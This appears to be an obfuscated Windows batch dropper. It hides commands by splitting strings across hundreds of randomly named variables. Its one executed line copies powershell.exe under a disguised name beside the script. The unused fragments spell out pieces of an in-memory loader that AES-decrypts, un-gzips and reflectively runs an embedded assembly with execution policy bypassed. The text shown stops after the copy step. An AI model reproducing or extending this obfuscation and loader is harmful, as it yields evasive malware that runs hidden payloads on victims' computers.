@echo off
set "qwufJOyxQi=he"
set "XshcYHiMAn=co"
set "LruVfXKkFS=nd"
set "RwidqQMkli=do"
set "BVrQwkWNtZ=xe"
set "YvdrDBhcIz=y "
set "UhmHgXwjBm=em"
set "DXGrHiMSRH=ow"
set "GrSdOdFyaG=we"
set "iyKNXDXKTO=Po"
set "CNVltSanNQ=s\"
set "uxtBKFnpZw=0\"
set "YyYnDdEqNH=ll"
set "FaFukYuFPq=:\"
set "njZXMFDHNa=st"
set "cZIWxgdkgj= C"
set "QOTsCgSzoE=we"
set "tjrYbnMqtN=po"
set "afsJiEMuCc=\v"
set "CjYujHaepJ=Wi"
set "YPvRvLOrak=1."
set "GEMqlUFhpc=rS"
set "jsncGXsLCV=py"
set "ptAMVXNnpA=in"
set "fZVwynFKpn=Sy"
set "DuOsxTEHnO=ws"
set "WxxPMEcjTu=32"
set "ZjvFVDLRYD=rs"
set "EiISHBkicS= /"
set "ZPpsxkNLcy=.e"
set "sfZBrsLvfM=he"
set "DbDEusOXyO=\W"
set "TbqwrOBwPq=ll"
set "naysIBMABt= %~dp0"
set "MbPkcRlfBW=cd"
set "CTSwlMFdcf=iron"
set "EHotLiitTp=zazA"
set "EZtnQcxHGb=ew-O"
set "VpxsbMSEdr=m.IO"
set "xUeWACAgLE=em.C"
set "JFkImRjEvS=[-1."
set "EkBGBrWKBR=yTo("
set "vlyrzbkVOS=]::N"
set "FSLYYfgyAF=y.Pa"
set "SaPuoZyeja=.Ass"
set "RPljswrZCp=6esa"
set "VxFJkKQEEU=; };"
set "wSzGZWJSmx=pher"
set "OmHpNdAUDz=.Cry"
set "DFYoWerJMa=.Cre"
set "lnYLuPbcrE=)))"
set "eIQZemIzAI=F'[-"
set "ygXKQDnKtr=ion."
set "ExQmRDyihq=sion"
set "waDatSlQLs=oL'["
set "QeFEQnwhoJ='[-1"
set "rPHwQJquhB=-1.."
set "EpiyBNgnfX=Comp"
set "OKTvcYvuzn=ptog"
set "XAxKcMtQLB=ow.I"
set "xKRxZCjxTR=pres"
set "qdxpblhDvC=stem"
set "RMoLvVppqT=lBlo"
set "pJGUvfibNy=oyOW"
set "ztpsoVDUmj=dj0C"
set "VNrBWFjZON=urit"
set "onfOylfWxg=();$"
set "VvPCRmfNuN=oin "
set "FiNxyTAXgb=zazA"
set "BiXpcDksFc=daeR"
set "CUttFlfqoC=tem."
set "zmbpiawYjP=Mn.T"
set "NezlDMbZZA=eMVs"
set "xBNznBfbkw=m.Re"
set "dNkqfEZwet=OY ="
set "eIVpYnLlpX=tS46"
set "WPOyPIgHOR=tsWi"
set "UrgQrMSYUL=ss -"
set "iEeHMPDlNB=gMn "
set "CIgHrxNJIY=Yzqo"
set "KhHngWKrFI=;$uk"
set "dBabDubNTX=  $S"
set "cRyTkYINCi=vert"
set "zRGNKqMaDy=:: '"
set "YWGEvxmZte=).Sp"
set "JKEwbqoQWJ=$wJw"
set "QfXnDlHuUT=('da"
set "ibiSDNpzAK=1] -"
set "KeGHYoifHw=.Sec"
set "mXVooIXfoz=gnir"
set "lXcscdMJpo=zqow"
set "CzhKKTMpXr=);$K"
set "YOrKilwkcu=.GZi"
set "WnPyItAeyA=zazA"
set "lkblDyTtYW=Syst"
set "gZuySjUSgH=Ci, "
set "lSCcFQIwBB=1..-"
set "gjKvnMjuJu=y]::"
set "gyQHQMMkpi=ress"
set "kKNjIHPpUb== $Y"
set "wjDtdzkwQw=gth)"
set "iVkMNjqMDY=.Mem"
set "QLBXxfegAH= [st"
set "kAKRRZRVEk=RmAx"
set "wOyvUXYwSj=V = "
set "VOHdVjYlff=-joi"
set "CxsoXweZyR=s75K"
set "EBgUiJGzFb= if "
set "ioADNDqfac=nirt"
set "DrEthuPAoO=.Dis"
set "koRuSotwvE=6] -"
set "uUdKscrmgt=-Obj"
set "SWTUmkDtlf=PKCS"
set "wBxEJHTuib=, (,"
set "PevPkOmlXw=-4] "
set "NDwyFdWHMC=gMn."
set "gWjpMECHKH=$KWz"
set "wSjbXhHYfK=AF ="
set "avOurHWMHd=('%*'"
set "wZISJAzitN=m.IO"
set "CKpjTxodfy=ach "
set "aGWGeqyERs='')("
set "LgNLLFOKBU=$rCH"
set "FQYqEVtKoK=lit("
set "WLqsXlXNyA=Mode"
set "IwqyQBphbJ===')"
set "NIGawCExfF=bjec"
set "KdtkjvGNVE=zqow"
set "LYqYENtCJL=.IO."
set "tyKejptztM=null"
set "QsLEtEZltD=ress"
set "bctgVItgoN=$JXw"
set "XmuFnzRBPr=yste"
set "laVWltbXNV=orF'"
set "mNTlVbbIRe=m(, "
set "AlEwCYlJXU== [S"
set "amooiJaLTt=onve"
set "XQlkIEXfvY='[-1"
set "jfYRYOclWE=$zaz"
set "SpvGEjkszW=saBm"
set "yIuwVJvokL=form"
set "OExLuphvtA=-nop"
set "IBBAyZKkKf=rt]:"
set "EZCRAiJAYc=em.I"
set "glvVHfDpng=($gP"
set "AczAxewPyM=wCi."
set "aNtBVjWaSD=yste"
set "MVDdWzpOKJ=pose"
set "YbpVVaxblm=oint"
set "mTuumNUuCg=::('"
set "eFymbwkMuL=pose"
set "wMaFPWQhcY= [Sy"
set "hcQjacYgeN=join"
set "gOfaPoXEWe=YxVw"
set "yCaQlYqbeJ=ose("
set "CgnYlIaQqm=ose("
set "HPoyUugJuf=morF"
set "JasQFsmusJ= [Sy"
set "GduBmTMeOa=);$Y"
set "jYnjObPSAs=Stre"
set "XwgHmzNQfI=.Cop"
set "myncxkjOSS=QkX."
set "qvbhlUxwxo=;$uk"
set "kRlGiPLyKL=gWG "
set "DnnuMPaPiK= New"
set "pfMsjkLUYy=tryP"
set "fxNedkHgEh=AF);"
set "VqflClWKIq=yste"
set "eHIpGgtDKa=rtS4"
set "URmuMFfcaY=tem."
set "SkrNrbyJnU=esaB"
set "dgOKCCIwxT=PxEW"
set "VakYsnKyBS=F = "
set "uwBdJCyllD=rofi"
set "nDRxjXYxgB=3); "
set "WfdprmwlcI= = $"
set "eyPIMEeeYP=[IO."
set "QPqjyAkBxU=.Com"
set "YwmqLdgAdb=se()"
set "HHqSpywcbu=rity"
set "REgGrgszxk=OY);"
set "oiLEqoKPbe==');"
set "pRtdToygWr=s = "
set "FetwZVsTfm=.Key"
set "aRbWPlxaQW=:('g"
set "CYWHhVZVwW=e]::"
set "tqHtlXVzUs=ay()"
set "MebJdEpZyJ=;$JX"
set "CDQIzjTSgU=mory"
set "pZNkXMuJba=F, 0"
set "wwKuzXNdfB=Secu"
set "uripEezSPZ=.Len"
set "PRHXYmZIQY=bypa"
set "mxPjSUfMam=flec"
set "IaCpxikEVH=Bmor"
set "BSUxOByuPR= = $"
set "GuFYqcRkeY=zt ="
set "BLMZQVMZRI=[]] "
set "SWAjdQsucY=ct S"
set "cpilPkCFnG=.Dis"
set "iYBZOsvOAF=and "
set "xsFWJpVEBP=rans"
set "ffuddBTNXl=QkX "
set "QFuiLUUBRi=Syst"
set "odvYlyHTzj=join"
set "qsuVKpUVAT=New-"
set "gJajynRGbr=l5E7"
set "byERgOJgGq=esMa"
set "TkzAHyBWsH=embl"
set "IahqZTDAIj=L4Yi"
set "BhYjCKZgQt='0Pg"
set "GjaIkeNBNX=ment"
set "gKjDloupnL=;$Zo"
set "qOsYcDNdTV=Star"
set "idbFjjOvHw=y.Ci"
set "lygZFwHMFQ=gsYZ"
set "GZToBkNhlK=azAF"
set "pIHQCiDVDG=WQh."
set "qhRhnGZGrs=i = "
set "IMyWmzTqSr=am;$"
set "BIYECmJyAn=..-1"
set "YMZzHNzOvR=gjYA"
set "KYQtycqmxo=t Sy"
set "npoMRpVztG=ZogW"
set "AhOYsCXpWe=]::("
set "ULRsTPVNbd=('%~f0'"
set "TrOgPEvncx=]::("
set "gBXqzIvlhO= = ["
set "LBnIGvHdNH=.Mod"
set "feZGbmhsyA=($gP"
set "AgVTsynXfq=k; }"
set "KexFUWXMTH=);$r"
set "AHspIlaYvf=Disp"
set "pSciRQQaDI=OY.T"
set "PKqhaqvAWj=fore"
set "omflGlGuvx=[Sys"
set "JXodiGyjYR=trea"
set "sHzvneqwLr=ring"
set "ayZrEOhybb=zuZI"
set "hwxeCaROoe=F = "
set "IvoPWbRnkU=;$ed"
set "FUGTXDUZWC='gni"
set "jcLzRJtvvW=le  "
set "dtnpTYKKlS= '')"
set "QMEqRWiqiZ=Secu"
set "bJqwkEaQtR=ddin"
set "EFKjXhLmIM=zqow"
set "ZaDiAfLhQN=$zaz"
set "rQHIOAydvE=Obje"
set "NbzuQaeVou=ispo"
set "QhbzkfGKcu=-joi"
set "qpIjdtWeAL=ne);"
set "BKYyGSCKLJ=ptog"
set "pIUeTOLaBE=tem."
set "nqDQtPHbes=ddin"
set "CCJnSGgeEE=zqow"
set "qgDTcjhWpj=();$"
set "WzaGnUlQNY=G.En"
set "XQLkBSTYZx=ing("
set "BsJqcbxAxU=n ''"
set "tHWxWfvcuo=oryS"
set "cGsMaxveNj=);$e"
set "dhdpnFeIUT=BC;$"
set "qhdkVFriuk=ypto"
set "WfnTERQalx=oArr"
set "pWNFffndwY=th('"
set "gtLGudzxbu=d;$Y"
set "wkEBqUQWvi=ke($"
set "IKsVYFMzmE=ptor"
set "TNunKWSMXE=();$"
set "OZNgVJYRsu=('Tg"
set "CbFWapzAvq=[Sys"
set "lbWgTocjpB=w.Pa"
set "PvCrMJZQmC=azAF"
set "DWMLPCldev=[Env"
set "DuKmMsYdrV=eam("
set "qxFWpGayqG=in $"
set "bIfEnbGhWn=..-1"
set "EKFgPlVzZM=.Cry"
set "PReDuNvbPY=brea"
set "encMMQSEty=ck($"
set "hoHcNwlygw=oyOW"
set "ufXrHcCeWZ=, $z"
set "qJnzdqyQTr=$Yzq"
set "goSFXUaiXS=g = "
set "VnmtdrEOPE=)($z"
set "rbXJOVVAJN=ert]"
set "JmHxDTjtMP= '')"
set "nUmajaRDCl=$ukg"
set "wmHGiAVoOk=hy.A"
set "uJTSFNwGZg=106u"
set "TUPwJIJWCs=raph"
set "IuHovytzKm=-ep "
set "wLKALPfTvZ=New-"
set "arJbBsmwZz=ect "
set "cKrtQTLadW=tion"
set "ZpPPGoLLqL=$rCH"
set "GqbqBfMMbS=CHOY"
set "VNpqeHNYxc=e = "
set "BlJBiXKZGf=File"
set "msShtVcwcy=Comp"
set "NSzUdPyzJH=n ''"
set "nBvOjZgSTS=zqow"
set "PenlZEXQYh=WzIs"
set "SUCqeSSTZE=.-16"
set "CnxqxftVhe=TllA"
set "DaBUHVkfLm=Invo"
set "mMqLslDlSu=O.Me"
set "TjHxAWtDxA=S46e"
set "QdulLLENhw=comp"
set "sYFdRSoLlh=] -j"
set "mjUXCLYBfS=ewLi"
set "UTeAIBkREg=Conv"
set "NfnQdwplfr=t) {"
set "FSKurfuhqQ=ionM"
set "YdtzyZuyEz=ateD"
set "pCZPaBxJQN=Obje"
set "iZvVAFlwtU=stem"
set "gvxEuGiqyN=ecry"
set "oaEETAFhZx=nage"
set "vxPIVYRFjp=gPQk"
set "EJlCQhpJnr=zHhH"
set "mUwHUdftRx=16] "
set "HTDLzsftBo=7;$Y"
set "UZspDqmQUV=$rCH"
set "pYhGiPwEgy=X.Su"
set "dzcikQaCBT=CFxo"
set "XOgeYzlwhH= = N"
set "FgcIsMWmZd=ct S"
set "VnPCnyvbac='txe"
set "YvDXgkyasz=pStr"
set "nYXakCnIJH=PTtG"
set "SlwzHrUjLb=JXwC"
set "tYXpqOvfOo=ress"
set "UlEbsuITZU=grap"
set "NggsTdoEMd=.Con"
set "eTYcEDpuzU=wJwz"
set "ImphiIGqaX=Is.D"
set "SmNrwJUiwh=gMod"
set "MkjrSOnKAQ=y.Cr"
set "RxrvNtvCDe=);$Y"
set "xDpUQmAteo=raph"
set "HscKTBjndF=ode]"
set "KaKqkckXvY=[Sys"
set "AOduujljfb=)($S"
set "qLOdBDUIvT=dWQh"
set "oHbOSXxKJq=bstr"
set "yLfvwaqqUe=::De"
set "oUlwQnGmFq=rity"
set "qERIQIZVQr=Fina"
set "XRwVYACNsm=stem"
set "zdzCDwJPnO=)) {"
set "VMawSZPnIl=comm"
set "DKpWCGRinm=Disp"
set "ChQpqyJsow=]::C"
set "UHAEtbjTsr=KWzI"
%XshcYHiMAn%%jsncGXsLCV%%cZIWxgdkgj%%FaFukYuFPq%%CjYujHaepJ%%LruVfXKkFS%%DXGrHiMSRH%%CNVltSanNQ%%fZVwynFKpn%%njZXMFDHNa%%UhmHgXwjBm%%WxxPMEcjTu%%DbDEusOXyO%%ptAMVXNnpA%%RwidqQMkli%%DuOsxTEHnO%%iyKNXDXKTO%%QOTsCgSzoE%%GEMqlUFhpc%%sfZBrsLvfM%%TbqwrOBwPq%%afsJiEMuCc%%YPvRvLOrak%%uxtBKFnpZw%%tjrYbnMqtN%%GrSdOdFyaG%%ZjvFVDLRYD%%qwufJOyxQi%%YyYnDdEqNH%%ZPpsxkNLcy%%BVrQwkWNtZ%%EiISHBkicS%%YvdrDBhcIz%"%~dp0%~nx0.exe"
